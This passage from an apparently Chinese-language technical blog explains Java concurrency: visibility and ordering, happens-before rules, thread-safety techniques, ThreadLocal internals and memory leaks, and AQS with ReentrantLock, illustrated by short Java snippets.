<h3 id="可见性-1"><a href="#可见性-1" class="headerlink" title="可见性"></a>可见性</h3><blockquote>
<p>可见性：当一个线程修改了共享变量后，其他线程能够立即得知这个修改</p>
</blockquote>
<p>当多个线程操作共享变量时，一个cpu中的线程读取主存数据到cpu缓存(线程工作内存)中，然后对共享变量进行修改，但cpu缓存中更改的变量还未flush到主存，此时线程对共享对象的更改对其他线程是不可见的，最终每个线程最终都会拷贝共享对象，而且拷贝的对象位于不同的cpu缓存中，造成缓存一致性问题</p>
<h4 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h4><ol>
<li><p>使用<code>volatile</code>关键字，保证变量直接从主存中读取，对变量的更新也会直接写到主存中</p>
</li>
<li><p><code>synchronized</code>，对一个变量执行<code>unlock</code>操作之前，必须将变量值同步会主存中</p>
</li>
<li><p>final：被<code>final</code>关键字修饰的字段在构造器中一旦初始化完成，并且没有发生<code>this</code>逃逸(其他通过this引用到初始化一半的对象)，那么其他线程就能看见<code>final</code>字段的值</p>
</li>
</ol>
<h3 id="有序性-1"><a href="#有序性-1" class="headerlink" title="有序性"></a>有序性</h3><blockquote>
<p>有序性：是指程序执行的顺序按照代码的先后顺序执行</p>
<p>cpu会对无依赖关系指令进行重排序优化，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性</p>
</blockquote>
<h4 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h4><ol>
<li>volatile关键字可以禁止指令重排序，volatile关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的代码放在内存屏障前面</li>
<li>synchronized来保证有序性，保证在同一时刻只有一个线程执行临界区代码，相当于让线程顺序执行同步代码。典型的应用是双重检锁的单例模式</li>
</ol>
<h2 id="JMM规范"><a href="#JMM规范" class="headerlink" title="JMM规范"></a>JMM规范</h2><blockquote>
<p>内存模型就是多线程下对共享变量的一组读写规则</p>
</blockquote>
<h3 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h3><blockquote>
<p>竞态条件</p>
</blockquote>
<p>在多线程下，没有依赖关系的代码，在执行共享变量读写操作(至少有一个线程写)时，并不能保证按照代码编写顺序执行，这称为发生了竞态条件，<strong>竞争是为了更好的性能</strong></p>
<h3 id="Synchronization-Order"><a href="#Synchronization-Order" class="headerlink" title="Synchronization Order"></a>Synchronization Order</h3><p>多线程下，每个线程的执行顺序按照编写顺序执行，那么必须使用<code>Synchronization Order</code>来保证</p>
<ol>
<li>LockSupport、synchronized</li>
<li>volatile方式读写变量</li>
</ol>
<h3 id="Happens-Before"><a href="#Happens-Before" class="headerlink" title="Happens-Before"></a>Happens-Before</h3><blockquote>
<p>先行发生原则</p>
</blockquote>
<p>用<code>Synchronized</code>和<code>volatile</code>可以保证有序性，此外，JVM还规定先行发生原则，让一个操作无需控制就能先于另一个操作完成</p>
<p>在JMM中，如果一个操作执行的结果需要对另一个操作可见，那么这俩个操作之间必须存在<code>Happens-before</code>关系，但并不意外着Java平台的具体实现必须要按照<code>happen-before</code>关系指定的顺序来执行，如果重排序之后的执行结果，与按<code>happens-before</code>关系来执行结果一致，那么这种重排序并不非法(也就是说，JMM允许这种重排序)</p>
<h4 id="单一线程原则"><a href="#单一线程原则" class="headerlink" title="单一线程原则"></a>单一线程原则</h4><blockquote>
<p>Single Thread Rule</p>
</blockquote>
<p>一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作</p>
<h4 id="管程锁定规则"><a href="#管程锁定规则" class="headerlink" title="管程锁定规则"></a>管程锁定规则</h4><blockquote>
<p>Monitor Lock Rule</p>
</blockquote>
<p>一个unlock操作先行发生于后面对同一个锁的lock操作</p>
<h4 id="volatile变量规则"><a href="#volatile变量规则" class="headerlink" title="volatile变量规则"></a>volatile变量规则</h4><blockquote>
<p>Volatile Variable Rule</p>
</blockquote>
<p>对一个变量的写操作先行发生于后面对这个变量的读操作</p>
<h4 id="传递规则"><a href="#传递规则" class="headerlink" title="传递规则"></a>传递规则</h4><blockquote>
<p>Transitivity</p>
</blockquote>
<p>如果操作A先行发生于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C</p>
<h4 id="线程启动规则"><a href="#线程启动规则" class="headerlink" title="线程启动规则"></a>线程启动规则</h4><blockquote>
<p>Thread Start Rule </p>
</blockquote>
<p>Thread对象的<code>start()</code>方法先行与此线程的每一个动作</p>
<h4 id="线程中断规则"><a href="#线程中断规则" class="headerlink" title="线程中断规则"></a>线程中断规则</h4><blockquote>
<p>Thread Interruption Rule</p>
</blockquote>
<p>对线程<code>interrupt()</code>方法的调用先行发生被中断线程的代码检测到中断事件的发生</p>
<h4 id="线程终结规则"><a href="#线程终结规则" class="headerlink" title="线程终结规则"></a>线程终结规则</h4><p>线程中所有的操作都先行发生于线程的终止检测，我们可以通过Thread.join()方法结束、Thread.isAlive()的返回值手段检测到线程已经终止执行。</p>
<h4 id="对象终结规则"><a href="#对象终结规则" class="headerlink" title="对象终结规则"></a>对象终结规则</h4><blockquote>
<p>Finalizer Rule</p>
</blockquote>
<p>一个对象的初始化完成先行与发生于他的<code>finalize()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MonitorDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span> </span>&#123;     <span class="comment">// 1</span></span><br><span class="line">        a++;                                <span class="comment">// 2</span></span><br><span class="line">    &#125;                                       <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span> </span>&#123;    <span class="comment">// 4</span></span><br><span class="line">        <span class="keyword">int</span> i = a;                         <span class="comment">// 5</span></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>从整体上来看，线程A的执行结果（a=1）对线程B是可见的，实现原理为：释放锁的时候会将值刷新到主内存中，其他线程获取锁时会强制从主内存中获取最新的值。另外也验证了2 happens-before 5，2的执行结果对5是可见的。</p>
</li>
<li><p>从横向来看，这就像线程A通过主内存中的共享变量和线程B进行通信，A 告诉 B 我们俩的共享数据现在为1啦，这种线程间的通信机制正好吻合java的内存模型正好是共享内存的并发模型结构。</p>
</li>
</ul>
<h1 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h1><blockquote>
<p>线程安全是指多个线程不管以何种的方式访问类，并且在主调代码不需要同步，都能表现出正确的行为</p>
</blockquote>
<p>线程安全有以下几种实现方式</p>
<h2 id="不可变"><a href="#不可变" class="headerlink" title="不可变"></a>不可变</h2><p>不可变对象一定是线程安全的，不需要采取任何的线程安全保障措施。只要一个不可变对象被正确构建出来，永远也不会看到它在多个线程之中处于不一致的状态，在多线程环境下，应当尽量使的对象成为不可变，来满足线程安全。</p>
<p>不可变对象可以保证线程安全，它们每个方法是原子的，多个方法组成不是原子的</p>
<h3 id="不可变的类型"><a href="#不可变的类型" class="headerlink" title="不可变的类型"></a>不可变的类型</h3><ol>
<li><p><code>final</code>修饰的基本数据类型</p>
</li>
<li><p><code>String</code></p>
</li>
<li><p>枚举类型<code>enum</code></p>
</li>
<li><p><code>Number</code>部分子类，如<code>Long</code>，<code>Double</code>等数值包装类型，<code>BigInteger</code>、<code>BigDecimal</code>等大数据类型。但是同为<code>Number</code>的原子类<code>AtomicInteger</code>和<code>AtomicLong</code>则是可变的</p>
</li>
<li><p>对于集合类型，可以使用<code>Collections.unmodifiableXXX</code>方法来获取一个不可变集合，<code>Collections.unmodifiableXXX()</code>先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImmutableExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Map&lt;String,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;String,Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map);</span><br><span class="line">        unmodifiableMap.put(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);<span class="comment">//会报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="保护性拷贝"><a href="#保护性拷贝" class="headerlink" title="保护性拷贝"></a>保护性拷贝</h3><p>String以及Number的不可变子类通过<strong>保护性拷贝</strong>保证对象的不可变的，即发生修改时，使用<strong>新建对象形式</strong>避免共享产生线程安全问题</p>
<h3 id="final原理"><a href="#final原理" class="headerlink" title="final原理"></a>final原理</h3><p>加入了写屏障保护，保证变量值的可见性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFinal</span></span>&#123;</span><br><span class="line">    <span class="comment">//1.分配内存空间</span></span><br><span class="line">    <span class="comment">//2.初始化0</span></span><br><span class="line">    <span class="comment">//3.赋值20</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> a=<span class="number">20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201010152712727.png" alt="image-20201010152712727" style="zoom:80%;" />

<h2 id="互斥同步"><a href="#互斥同步" class="headerlink" title="互斥同步"></a>互斥同步</h2><p>使用<code>ReentrantLock</code>，<code>Synchronized</code>进行同步</p>
<p>例如 <code>HashTable</code>，<code>StringBuffer</code>，<code>Collections.synchronizedXXX</code>等等</p>
<h2 id="非阻塞同步"><a href="#非阻塞同步" class="headerlink" title="非阻塞同步"></a>非阻塞同步</h2><p>互斥同步最主要的问题是线程阻塞和唤醒带来的性能问题，因此这种同步也称为阻塞同步</p>
<p>互斥同步属于一种<strong>悲观的并发策略</strong>，总是认为只要不去做正确的同步措施，那就肯定会出现问题。无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。</p>
<p>随着硬件指令集的发展，我们可以使用<strong>基于冲突检测的乐观并发策略</strong>：先进行操作，如果没有其它线程争用共享数据，那操作就成功了，否则采取补偿措施（不断地重试，直到成功为止）。这种乐观的并发策略的许多实现都不需要将线程阻塞，因此这种同步操作称为非阻塞同步。</p>
<h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>乐观锁需要操作和冲突检测这两个步骤具有原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：<strong>比较并交换</strong>（Compare-and-Swap，CAS）。<code>CAS</code>指令需要3个操作数，分别是内存地址<code>V</code>，旧的预期值<code>A</code>和新值<code>B</code>。当执行操作时，只有当<code>V</code>的值等于<code>A</code>,才将<code>V</code>的值更新为<code>B</code>。</p>
<h2 id="无同步方案"><a href="#无同步方案" class="headerlink" title="无同步方案"></a>无同步方案</h2><p>要保证线程安全，并不是一定要进行同步，如果一个方法本来就不涉及共享数据，那么它就无需任何同步措施去保证正确性</p>
<h3 id="栈封闭"><a href="#栈封闭" class="headerlink" title="栈封闭"></a>栈封闭</h3><p>多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在虚拟机栈中，属于线程私有的内存区域</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StackClosedExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add100</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(cnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        StackClosedExample example = <span class="keyword">new</span> StackClosedExample();</span><br><span class="line">        ExecutorService executorService = Executors.newCachedThreadPool();</span><br><span class="line">        executorService.execute(() -&gt; example.add100());  <span class="comment">//100</span></span><br><span class="line">        executorService.execute(() -&gt; example.add100());  <span class="comment">//100</span></span><br><span class="line">        executorService.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="线程本地存储"><a href="#线程本地存储" class="headerlink" title="线程本地存储"></a>线程本地存储</h3><p>如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，就可以把<strong>共享数据的可见范围限制在一个线程之内</strong>，这样，无需同步也能保证线程之间不出现数据争用的问题。</p>
<p>符合这种特点的应用并不少见，大部分使用消费队列的架构模式(如生产者-消费者模式)都会将产品的消费过程尽量在一个线程中消费完。其中最重要的一个应用实例就是经典Web交互模型中的”一个请求对应一个服务器线程(<code>Thread-per-Request</code>)”的处理方式，这种处理方式的广泛应用使得很多 Web服务端应用都可以<strong>使用线程本地存储</strong>来解决线程安全问题。</p>
<p>可以使用<code>java.lang.ThreadLocal</code>类来实现线程本地存储功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocalExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ThreadLocal threadLocal = <span class="keyword">new</span> ThreadLocal();</span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            threadLocal.set(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(threadLocal.get());   <span class="comment">//输出1</span></span><br><span class="line">            threadLocal.remove();</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            threadLocal.set(<span class="number">2</span>);</span><br><span class="line">            threadLocal.remove();</span><br><span class="line">        &#125;);</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="可重入代码"><a href="#可重入代码" class="headerlink" title="可重入代码"></a>可重入代码</h3><p>这些代码也叫做纯代码（Pure Code）,可以在代码执行的任何时刻中断它，转而去掉用其他代码(包括递归调用它本身)，而在控制权返回后，原来的程序不会出现任何错误</p>
<p>可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源，用到的状态量都由参数中传入、不调用非可重入的方法等。</p>
<h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><blockquote>
<p><code>ThreadLocal</code>类主要解决就是让每个线程绑定自己的值，可以将<code>ThreadLocal</code>类形象的比喻成放数据的盒子，盒子中可以存储每个线程的私有数据</p>
</blockquote>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果创建一个<code>ThreadLocal</code>变量，那么访问这个变量的每个线程都有这个变量的本地副本。</p>
<p>它们可以使用<code>set()</code>和<code>get()</code>方法来获取默认值或将其值更改为当前线程所存副本的值，从而避免线程安全的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ThreadLocal&lt;Integer&gt; integerThreadLocal = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">ThreadLocal&lt;String&gt; stringThreadLocal = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">ExecutorService service = Executors.newCachedThreadPool();</span><br><span class="line">service.execute(</span><br><span class="line">    () -&gt; &#123;</span><br><span class="line">        <span class="comment">// ... do something inside runnable task</span></span><br><span class="line">        integerThreadLocal.set(<span class="number">1</span>);</span><br><span class="line">        stringThreadLocal.set(<span class="string">&quot;数字1&quot;</span>);</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot; &quot;</span>+integerThreadLocal.get()+<span class="string">&quot; &quot;</span>+stringThreadLocal.get());</span><br><span class="line">    &#125;);</span><br><span class="line">service.execute(()-&gt;&#123;</span><br><span class="line">    integerThreadLocal.set(<span class="number">2</span>);</span><br><span class="line">    stringThreadLocal.set(<span class="string">&quot;数字2&quot;</span>);</span><br><span class="line">    System.out.println(Thread.currentThread().getName()+<span class="string">&quot; &quot;</span>+integerThreadLocal.get()+<span class="string">&quot; &quot;</span>+stringThreadLocal.get());</span><br><span class="line">&#125;);</span><br><span class="line">service.shutdown();</span><br></pre></td></tr></table></figure>

<p>以上代码对应的底层结构图：</p>
<p><img src="https://csn.damyoung.cn/ThreadLocal%E6%A8%A1%E5%9E%8B.png"></p>
<p>每个<code>Thread</code>都有一个<code>ThreadLocal.ThreadLocalMap</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//与此线程有关的ThreadLocal值。由ThreadLocal类维护</span></span><br><span class="line">ThreadLocal.ThreadLocalMap threadLocals = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//与此线程有关的InheritableThreadLocal值。由InheritableThreadLocal类维护</span></span><br><span class="line">ThreadLocal.ThreadLocalMap inheritableThreadLocals = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<p>可以<code>ThreadLocalMap</code>理解为<code>ThreadLocal</code>类实现的定制化<code>HashMap</code>，默认情况下这两个变量为null，只有当当前线程调用<code>ThreadLocal</code>类的<code>set</code>或<code>get</code>方法时才会创建它们，实际上调用的<code>ThreadLocalMap</code>的<code>get</code>，<code>set</code>方法</p>
<p>当调用一个<code>ThreadLocal</code>的<code>set(T value)</code>方法时，先得到当前线程的<code>ThreadLocalMap</code>对象，然后将<code>ThreadLocal-&gt;value</code>键值对插入到该<code>Map</code>中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>)</span><br><span class="line">        map.set(<span class="keyword">this</span>, value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        createMap(t, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ThreadLocalMap <span class="title">getMap</span><span class="params">(Thread t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t.threadLocals;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createMap</span><span class="params">(Thread t, T firstValue)</span> </span>&#123;</span><br><span class="line">    t.threadLocals = <span class="keyword">new</span> ThreadLocalMap(<span class="keyword">this</span>, firstValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ThreadLocalMap.Entry e = map.getEntry(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            T result = (T)e.value;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> setInitialValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个<code>Thread</code>中都具备一个<code>ThreadLocalMap</code>,而<code>ThreadLocalMap</code>可以存储以<code>ThreadLocal</code>为<code>key</code>的键值对。<code>ThreadLocalMap</code>的<code>key</code>就是<code>ThreadLocal</code>对象，<code>value</code>就是<code>ThreadLocal</code>对象调用<code>set</code>方法设置的值</p>
<p><code>ThreadLocal</code>从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol>
<li>比如线程中处理一个非常复杂的业务，那么使用ThreadLocal可以代替一些参数的显式传递</li>
<li>用来存储用户session，Session的特性很适合ThreadLocal，因为Session只在当前会话周期有效，会话结束后就销毁</li>
<li>在一些多线程的情况下，如果用线程同步的方式，当并发比较高的时候会影响性能，可以改为 ThreadLocal 的方式，例如高性能序列化框架 Kyro 就要用 ThreadLocal 来保证高性能和线程安全；</li>
<li>还有像线程内上线文管理器、数据库连接等可以用到 ThreadLocal;</li>
</ol>
<p>在一些场景 (尤其是使用线程池) 下，由于<code>ThreadLocal.ThreadLocalMap</code>的底层数据结构导致<code>ThreadLocal</code>有内存泄漏的情况，应该尽可能在每次使用<code>ThreadLocal</code>后手动调用<code>remove()</code>，以避免出现<code>ThreadLocal</code>经典的内存泄漏甚至是造成自身业务混乱的风险。</p>
<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><p><code>ThreadLocalMap</code>中使用的<code>key</code>为<code>ThreadLocal</code>的弱引用，所以，如果<code>ThreadLocal</code>没有被外部强引用的情况下，在垃圾回收的时候<code>key</code>会被清理掉，而<code>value</code>不会被清理掉。这样依赖，<code>ThreadLocalMap</code>中就会出现<code>key</code>为<code>null</code>的<code>Entry</code>。如果不采取任何措施的话，<code>value</code>永远无法被GC回收，这个时候可能会产生内存泄漏。<code>ThreadLocalMap</code>实现中考虑到了这种情况，在调用<code>set()</code>,<code>get()</code>,<code>remove()</code>方法的时候，会清理掉<code>key</code>为<code>null</code>的记录。在使用完<code>ThreadLocal</code>方法之后，最好手动使用<code>remove()</code>方法。原因：</p>
<ul>
<li>使用<code>static</code>的<code>ThreadLocal</code>，延长了<code>ThreadLocal</code>生命周期，可能导致内存泄漏</li>
<li>分配使用了<code>ThreadLocal</code>又不调用<code>set()</code>,<code>get()</code>,<code>remove()</code>方法，那么就会导致内存泄漏。</li>
</ul>
<blockquote>
<p><strong>弱引用</strong>：如果一个对象只具有弱引用，那就类似于可有可无的生活用品。弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程， 因此不一定会很快发现那些只具有弱引用的对象。</p>
<p>弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java虚拟机就会把这个弱引用加入到与之关联的引用队列中。</p>
</blockquote>
<h3 id="为什么使用弱引用？"><a href="#为什么使用弱引用？" class="headerlink" title="为什么使用弱引用？"></a>为什么使用弱引用？</h3><p>分析两种情况：</p>
<ul>
<li><code>key</code>使用强引用：引用的<code>ThreadLocal</code>的对象被回收了，但是<code>ThreadLocalMap</code>还持有<code>ThreadLocal</code>的强引用，如果没有手动删除，<code>ThreadLocal</code>不会被回收，导致<code>Entry</code>内存泄漏。</li>
<li><code>key</code>使用弱引用：引用的<code>ThreadLocal</code>的对象被回收了，由于<code>ThreadLocalMap</code>持有<code>ThreadLocal</code>的弱引用，即使没有手动删除，<code>ThreadLocal</code>也会被回收。<code>value</code>在下一次ThreadLocalMap调用<code>set</code>,<code>get</code>，<code>remove</code>的时候会被清除。</li>
</ul>
<p>比较两种情况，可以发现：由于<code>ThreadLocalMap</code>的生命周期跟<code>Thread</code>一样长，如果都没有手动删除对应<code>key</code>，都会导致内存泄漏，但是使用弱引用可以多一层保障：弱引用<code>ThreadLocal</code>不会内存泄漏，对应的<code>value</code>在下一次<code>ThreadLocalMap</code>调用<code>set,get,remove</code>的时候会被清除。</p>
<p>因此，<code>ThreadLocal</code>内存泄漏的根源是：<strong>由于<code>ThreadLocalMap</code>的生命周期跟<code>Thread</code>一样长，如果没有手动删除对应<code>key</code>的<code>value</code>就会导致内存泄漏</strong>，而不是因为弱引用。</p>
<h1 id="JUC的AQS"><a href="#JUC的AQS" class="headerlink" title="JUC的AQS"></a>JUC的AQS</h1><p><code>AbstractQueueSynchronizer</code>同步器：用来构建阻塞式锁和其他同步组件的基本框架，通过FIFO等待队列完成获取资源线程排队工作，使用AQS能够简单且高效地构造出应用广泛的大量的同步器，<code>ReentrantLock</code>、<code>CountDownLatch</code>、<code>CyclicBarrier</code>、<code>Semaphore</code>、<code>FutureTask</code></p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="CLH"><a href="#CLH" class="headerlink" title="CLH"></a>CLH</h3><p>如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效线程，并且将共享资源设置为锁定状态。</p>
<p>如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配机制，这个机制AQS是CLH队列锁实现的，即将暂时获取不到锁的线程加入该队列中。</p>
<blockquote>
<p>CLH队列是一个虚拟的双向队列(虚拟的双向队列即不存在队列的实例，仅存在结点之间的关联关系)</p>
<p>AQS是将每条请求共享资源的线程封装成一个CLH锁队列的一个结点来实现锁的分配</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">	<span class="comment">//AQS内部节点类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="同步状态"><a href="#同步状态" class="headerlink" title="同步状态"></a>同步状态</h3><p>AQS使用一个<code>int</code>类型的成员变量来表示同步状态，通过内置的<code>FIFO</code>队列来完成获取资源线程的排队工作，AQS使用CAS对该同步状态进行原子操作实现对其值的修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state; <span class="comment">//共享变量，使用volatile修饰保证线程可见性</span></span><br></pre></td></tr></table></figure>

<p>状态信息通过<code>protected</code>类型的<code>getState</code>，<code>setState</code>，<code>compareAndSetState</code>进行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> newState)</span> </span>&#123;</span><br><span class="line">    state = newState;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原子地（CAS操作）将同步状态值设置为给定值update（如果当前同步状态的值等于expect（期望值）</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">compareAndSetState</span><span class="params">(<span class="keyword">int</span> expect, <span class="keyword">int</span> update)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// See below for intrinsics setup to support this</span></span><br><span class="line">    <span class="keyword">return</span> unsafe.compareAndSwapInt(<span class="keyword">this</span>, stateOffset, expect, update);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="共享方式"><a href="#共享方式" class="headerlink" title="共享方式"></a>共享方式</h3><p>AQS应用模板模式，分为3类</p>
<ul>
<li>独占式获取与释放同步状态 </li>
<li>共享式获取与释放同步状态</li>
<li>查询同步队列中的等待线程情况。</li>
</ul>
<ol>
<li>Exclusive独占锁：只有一个线程能执行，如<code>ReentrantLock</code>，又可再划分为非公平锁和公平锁</li>
<li>Share共享锁：多个线程可同时执行，如<code>Semaphore/CountDownLatch</code></li>
</ol>
<h2 id="ReentrantLock-1"><a href="#ReentrantLock-1" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>ReentrantLock 属于 AQS 的一个子类，AQS 依赖于内部的 FIFO 同步队列（<code>CLH</code>）来完成同步状态的管理，当前线程获取同步状态失败时，同步器会将当前线程以及等待状态等信息构造成一个 <code>Node</code> 对象并将其加入到同步队列，同时会阻塞当前线程，当同步状态释放时，会把首节点中的线程唤醒，使其再次尝试获取同步状态。</p>
